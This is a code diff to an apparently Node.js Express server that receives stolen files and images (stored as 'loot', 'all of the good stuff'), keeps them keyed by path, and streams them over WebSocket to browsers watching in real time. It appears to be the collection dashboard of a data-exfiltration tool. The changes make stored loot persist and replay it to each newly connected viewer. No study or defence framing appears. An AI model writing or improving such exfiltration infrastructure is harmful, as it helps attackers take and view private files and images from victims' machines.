@@ -15,8 +15,8 @@ app.use(express.urlencoded({ extended: true }));
 // stores all of the good stuff
 const loot = {
   directories: {},
-  files: [],
-  images: []
+  files: {},
+  images: {}
 };
 
 //Function to send out the data to each person connected
@@ -69,6 +69,7 @@ app.post('/upload/files', (req, res) => {
   const path = req.body.substring(0, firstNewline).trim(); // Gets the full path of the file, including the .png .txt etc etc
   const text = req.body.substring(firstNewline+1); // Gets the text within the file that was sent
   console.log('File received', path); // Logs to console for debugging
+  loot.files[path] = text;
   broadcast('files', {path,text}); // broadcasts to browsers on the page
   res.sendStatus(200); // Confirm connection
 });
@@ -78,6 +79,7 @@ app.post('/upload/image', (req, res) => {
   const path = req.body.substring(0, firstNewline).trim();
   const base64 = req.body.substring(firstNewline + 1); // Gets full path of file, and the base64 string that 'contains' the image
   console.log('Image received:', path); // for debugging
+  loot.images[path] = base64;
   broadcast('image', { path, base64 }); // broadcast to the active connections
   res.sendStatus(200);
 });
@@ -97,7 +99,13 @@ app.get('/api/loot', (req, res) => {
 
 wss.on('connection', (ws) => {
   console.log('Browser connected');
-  ws.send(JSON.stringify({ type: 'init', data: loot }));
+  ws.send(JSON.stringify({ type: 'dirs', data: loot.directories }));
+  Object.entries(loot.files).forEach(([path, text]) => {
+    ws.send(JSON.stringify({ type: 'files', data: { path, text } }));
+  });
+  Object.entries(loot.images).forEach(([path, base64]) => {
+    ws.send(JSON.stringify({ type: 'image', data: { path, base64 } }));
+  });
 });
 
 server.listen(8080, () => console.log('Listening on 8080'));
